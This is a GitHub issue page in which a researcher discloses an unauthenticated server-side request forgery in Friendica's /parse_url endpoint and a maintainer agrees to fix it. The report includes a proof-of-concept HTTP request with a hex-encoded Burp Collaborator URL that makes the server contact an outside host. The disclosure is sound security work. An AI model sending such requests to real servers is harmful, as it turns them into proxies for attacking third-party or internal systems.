=== Content from github.com_4754c810_20250115_102205.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffriendica%2Ffriendica%2Fissues%2F9929)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffriendica%2Ffriendica%2Fissues%2F9929)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=friendica%2Ffriendica)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[friendica](/friendica)
/
**[friendica](/friendica/friendica)**
Public

forked from [duthied/Free-Friendika](/duthied/Free-Friendika)

* [Notifications](/login?return_to=%2Ffriendica%2Ffriendica) You must be signed in to change notification settings
* [Fork
  342](/login?return_to=%2Ffriendica%2Ffriendica)
* [Star
   1.5k](/login?return_to=%2Ffriendica%2Ffriendica)

* [Code](/friendica/friendica)
* [Issues
  1.3k](/friendica/friendica/issues)
* [Pull requests
  16](/friendica/friendica/pulls)
* [Actions](/friendica/friendica/actions)
* [Wiki](/friendica/friendica/wiki)
* [Security](/friendica/friendica/security)
* [Insights](/friendica/friendica/pulse)

Additional navigation options

* [Code](/friendica/friendica)
* [Issues](/friendica/friendica/issues)
* [Pull requests](/friendica/friendica/pulls)
* [Actions](/friendica/friendica/actions)
* [Wiki](/friendica/friendica/wiki)
* [Security](/friendica/friendica/security)
* [Insights](/friendica/friendica/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Ffriendica%2Ffriendica%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Ffriendica%2Ffriendica%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# External service interaction (HTTP & DNS) #9929

Closed

[parad0x-0xff](/parad0x-0xff) opened this issue
Feb 14, 2021
· 5 comments
 · Fixed by [#9935](https://github.com/friendica/friendica/pull/9935)

Closed

# [External service interaction (HTTP & DNS)](#top) #9929

[parad0x-0xff](/parad0x-0xff) opened this issue
Feb 14, 2021
· 5 comments
 · Fixed by [#9935](https://github.com/friendica/friendica/pull/9935)

Assignees
[![@MrPetovan](https://avatars.githubusercontent.com/u/925415?s=40&v=4)](/MrPetovan)

Labels
[Bug](/friendica/friendica/labels/Bug)
[Security](/friendica/friendica/labels/Security)

Milestone
[2021.03](/friendica/friendica/milestone/23 "2021.03")

## Comments

[![@parad0x-0xff](https://avatars.githubusercontent.com/u/62678327?s=80&u=0358bb8229483043abc89494b0b832f0b98b30f1&v=4)](/parad0x-0xff)

Copy link

### **[parad0x-0xff](/parad0x-0xff)** commented [Feb 14, 2021](#issue-807880142)

| **Hello Friendica Team.** Issue detail I found a vulnerability issue while testing frendica locally. It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names and HTTP request. Bug Description The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. Steps to Reproduce **The request:**  ``` GET /parse_url?binurl=73767274703267776f7375713063623539706668336f69366a78706e64632e62757270636f6c6c61626f7261746f722e6e6574&_=1613263595343 HTTP/1.1 Host: 192.168.0.3 Pragma: no-cache Cache-Control: no-cache, no-transform Connection: close  ```  **The response:**  ``` HTTP/1.1 200 OK Date: Sun, 14 Feb 2021 03:02:34 GMT Server: Apache/2.4.38 (Debian) X-Powered-By: PHP/7.3.27 Set-Cookie: PHPSESSID=9f79e6ff0575a2775860501f03d5095b; path=/; HttpOnly Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache X-Account-Management-Status: none Vary: Accept-Encoding Content-Length: 103 Connection: close Content-Type: text/html; charset=UTF-8  [attachment type='link' url='http://svrtp2gwosuq0cb59pfh3oi6jxpndc.burpcollaborator.net'][/attachment]  ```  **The DNS and HTTP request received:** [image](https://user-images.githubusercontent.com/62678327/107867331-d84c7980-6e58-11eb-9f72-a9b39c490212.png) More details To make this request doesn't need to be authenticated, the friendica application accepts any request as an attachment and next do the DNS lookup and the HTTP request. Issue remediation You should review the purpose and intended use of the relevant application functionality, and determine whether the ability to trigger arbitrary external service interactions is intended behavior. If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter. If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist. References  * [External service interaction (DNS)](https://portswigger.net/kb/issues/00300200_external-service-interaction-dns) * [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html) * [CWE-406: Insufficient Control of Network Message Volume (Network Amplification)](https://cwe.mitre.org/data/definitions/406.html)  Platform Info This is Friendica, version 2021.01 that is running at the web location localhost The database version is 1384/1384, the post update version is 1383/.   * Apache/2.4.38 (Debian) * PHP/7.3.27 * mysql Ver 15.1 Distrib 10.5.8-MariaDB, for debian-linux-gnu (x86\_64) using readline 5.2 |
| --- |
| The text was updated successfully, but these errors were encountered: |

 👍
1
 Quix0r reacted with thumbs up emoji
 👀
1
 AlfredSK reacted with eyes emoji

All reactions

* 👍
  1 reaction
* 👀
  1 reaction

[![@parad0x-0xff](https://avatars.githubusercontent.com/u/62678327?s=40&u=0358bb8229483043abc89494b0b832f0b98b30f1&v=4)](/parad0x-0xff)
[parad0x-0xff](/parad0x-0xff)
added
the
[Bug](/friendica/friendica/labels/Bug)
label
[Feb 14, 2021](#event-4328364335)

[![@MrPetovan](https://avatars.githubusercontent.com/u/925415?s=80&u=08a857bce3454c450582fab6488242638bf406a0&v=4)](/MrPetovan)

Copy link

Collaborator

### **[MrPetovan](/MrPetovan)** commented [Feb 14, 2021](#issuecomment-778792264)

| Thank you for the detailed report. This endpoint doesn't need to be accessible without authentication and should be limited to authenticated users.  Beyond that, we do need this endpoint to be able to provide arbitrary link previews to users in their posts. The scope of allowed URLs is too wide to implement a meaningful allowlist. That said, we could cache the response for a while node-wide to prevent ping backs systems from gathering too much data.  So two improvements axes:   * Block access to anonymous users. * For a given URL, cache the response for an hour. |
| --- |

 👍
2
 parad0x-0xff and Quix0r reacted with thumbs up emoji

All reactions

* 👍
  2 reactions

Sorry, something went wrong.

[![@MrPetovan](https://avatars.githubusercontent.com/u/925415?s=40&u=08a857bce3454c450582fab6488242638bf406a0&v=4)](/MrPetovan)
[MrPetovan](/MrPetovan)
added
the
[Security](/friendica/friendica/labels/Security)
label
[Feb 14, 2021](#event-4328820316)

[![@MrPetovan](https://avatars.githubusercontent.com/u/925415?s=40&u=08a857bce3454c450582fab6488242638bf406a0&v=4)](/MrPetovan)
[MrPetovan](/MrPetovan)
self-assigned this
[Feb 14, 2021](#event-4328860620)

[![@parad0x-0xff](https://avatars.githubusercontent.com/u/62678327?s=80&u=0358bb8229483043abc89494b0b832f0b98b30f1&v=4)](/parad0x-0xff)

Copy link

Author

### **[parad0x-0xff](/parad0x-0xff)** commented [Feb 15, 2021](#issuecomment-778868044)

| It's really nice hear that \o/ I got your point, the authentication on this endpoint will improve the security. But I'm still thinking about the DNS query is this really necessary?  For this specific endpoint I understood that is about giving an URL to share with others users. But why the endpoint make a DNS and HTTP request before anyone click on the link? Anyone with malicious thought could use any public server of friendica as proxy to send requests by them or as part of a botnet.  Another thing that I'd like to ask you is, may I proceed with the opening of a CVE? |
| --- |

All reactions

Sorry, something went wrong.

[![@MrPetovan](https://avatars.githubusercontent.com/u/925415?s=80&u=08a857bce3454c450582fab6488242638bf406a0&v=4)](/MrPetovan)

Copy link

Collaborator

### **[MrPetovan](/MrPetovan)** commented [Feb 15, 2021](#issuecomment-778875343)

| But I'm still thinking about the DNS query is this really necessary? For this specific endpoint I understood that is about giving an URL to share with others users. But why the endpoint make a DNS and HTTP request before anyone click on the link?  No, the point of this endpoint is to extract title, description and image from the target URL to create a link preview card in a post. As such it does have to do a DNS and HTTP request. However, making it authenticated will remove the opportunity to use for nefarious means by anonymous users, and caching the answer will prevent potential spam/tracking by severely limiting the amount of outgoing HTTP requests actually sent out when this endpoint is used.  Another thing that I'd like to ask you is, may I proceed with the opening of a CVE?  I have no idea what this means for us, can you please elaborate? |
| --- |

All reactions

Sorry, something went wrong.

[![@parad0x-0xff](https://avatars.githubusercontent.com/u/62678327?s=80&u=0358bb8229483043abc89494b0b832f0b98b30f1&v=4)](/parad0x-0xff)

Copy link

Author

### **[parad0x-0xff](/parad0x-0xff)** commented [Feb 15, 2021](#issuecomment-778883593)

| No, the point of this endpoint is to extract title, description and image from the target URL to create a link preview card in a post. As such it does have to do a DNS and HTTP request. However, making it authenticated will remove the opportunity to use for nefarious means by anonymous users, and caching the answer will prevent potential spam/tracking by severely limiting the amount of outgoing HTTP requests actually sent out when this endpoint is used.  Thanks for the explaining.  I have no idea what this means for us, can you please elaborate?  CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. When someone refers to a CVE, they mean a security flaw that's been assigned a CVE ID number.  Basically, having a CVE ID assigned to a specific vulnerability makes it easier for enterprises who uses your software to check for security issues. For you it means you guys care for security and are willing to let this vulnerability be part of a security database. Like MITRE wrote:  "CVE Records [...] provide reference points for data exchange so that cybersecurity products and services can speak with each other." - [MITRE Corporation](https://cve.mitre.org/about/index.html) |
| --- |

All reactions

Sorry, something went wrong.

[![@MrPetovan](https://avatars.githubusercontent.com/u/925415?s=80&u=08a857bce3454c450582fab6488242638bf406a0&v=4)](/MrPetovan)

Copy link

Collaborator

### **[MrPetovan](/MrPetovan)** commented [Feb 15, 2021](#issuecomment-778884721)

| Thank you for your explanation, we don't have any presence with enterprises so it probably won't help anyone but it won't do us any harm either, please go forward if you feel it's warranted. |
| --- |

 ❤️
1
 parad0x-0xff reacted with heart emoji

All reactions

* ❤️
  1 reaction

Sorry, something went wrong.

[![@MrPetovan](https://avatars.githubusercontent.com/u/925415?s=40&u=08a857bce3454c450582fab6488242638bf406a0&v=4)](/MrPetovan)
[MrPetovan](/MrPetovan)
added this to the [2021.03](/friendica/friendica/milestone/23) milestone
[Feb 15, 2021](#event-4329629537)

[![@MrPetovan](https://avatars.githubusercontent.com/u/925415?s=40&u=08a857bce3454c450582fab6488242638bf406a0&v=4)](/MrPetovan)
[MrPetovan](/MrPetovan)
mentioned this issue
[Feb 16, 2021](#ref-pullrequest-809409863)

[Harden /parseurl
#9935](/friendica/friendica/pull/9935)
 Merged

[![@annando](https://avatars.githubusercontent.com/u/844208?s=40&u=e6b28cb2c380d453152f409e5da897c4e93063a1&v=4)](/annando)
[annando](/annando)
closed this as [completed](/friendica/friendica/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
in
[#9935](/friendica/friendica/pull/9935)
[Feb 19, 2021](#event-4350453400)

[![@MrPetovan](https://avatars.githubusercontent.com/u/925415?s=40&u=08a857bce3454c450582fab6488242638bf406a0&v=4)](/MrPetovan)
[MrPetovan](/MrPetovan)
mentioned this issue
[Mar 12, 2021](#ref-pullrequest-830632569)

[Issue 10019: Fix embedding of media objects
#10038](/friendica/friendica/pull/10038)
 Merged

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Ffriendica%2Ffriendica%2Fissues%2F9929)

Assignees

[![@MrPetovan](https://avatars.githubusercontent.com/u/925415?s=40&v=4)](/MrPetovan) [MrPetovan](/MrPetovan)

Labels

[Bug](/friendica/friendica/labels/Bug)
[Security](/friendica/friendica/labels/Security)

Projects

None yet

Milestone

 [**2021.03**](/friendica/friendica/milestone/23 "2021.03")

Development

Successfully merging a pull request may close this issue.

 [Harden /parseurl](/friendica/friendica/pull/9935)
 [MrPetovan/friendica](/MrPetovan/friendica)

2 participants

[![@MrPetovan](https://avatars.githubusercontent.com/u/925415?s=52&v=4)](/MrPetovan) [![@parad0x-0xff](https://avatars.githubusercontent.com/u/62678327?s=52&v=4)](/parad0x-0xff)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


